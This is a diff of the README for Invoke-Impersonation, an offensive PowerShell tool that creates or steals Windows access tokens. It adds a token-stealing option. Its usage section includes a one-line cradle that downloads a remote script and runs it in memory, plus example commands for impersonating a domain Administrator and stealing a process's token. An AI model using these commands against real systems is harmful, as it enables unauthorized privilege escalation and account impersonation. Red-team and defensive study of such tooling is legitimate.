@@ -1,9 +1,9 @@
 # Invoke-Impersonation
-Make_Token function written in powershell. Create a token with the provided credentials
+Make a Token (local admin rights not required) or Steal the Token of the specified Process ID (local admin rights required)
 
 ### Note:
 
-The logon session created has the same local identifier as the caller. If you run commands that access local resources (like whoami or creating files locally), they will appear to be run under the original user context. 
+The logon session created has the same local identifier as the caller. If you run commands that access local resources (like whoami), they will appear to be run under the original user context. 
 
 This is because, locally, nothing has changed. The LUID is the same as the caller, so it appears as though you're still the original user.
 
@@ -20,9 +20,14 @@ Use `rev2self` to drop any impersonation that may be in play.
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-Impersonation/main/Invoke-Impersonation.ps1')
 ```
 
-### Make a token (Impersonate a user)
+### Make a token
 ```
-Invoke-Impersonation -Username "Administrator" -Domain "ferrari.local" -Password "P@ssw0rd!"
+Invoke-Impersonation -MakeToken -Username "Administrator" -Domain "ferrari.local" -Password "P@ssw0rd!"
+```
+
+### Steal a token
+```
+Invoke-Impersonation -Steal -ProcessID 5380
 ```
 
 ### Rev2Self
@@ -30,4 +35,7 @@ Invoke-Impersonation -Username "Administrator" -Domain "ferrari.local" -Password
 Invoke-Impersonation -RevertToSelf
 ```
 
-![image](https://github.com/Leo4j/Invoke-Impersonation/assets/61951374/3b4cb0a5-ea64-4275-8119-5bfc2860b5c8)
+![image](https://github.com/Leo4j/Invoke-Impersonation/assets/61951374/8a16bca9-b214-4e76-ba0e-b577585e9185)
+
+![image](https://github.com/Leo4j/Invoke-Impersonation/assets/61951374/12025262-07fa-4df4-9c77-dc9d2f6bcc34)
+
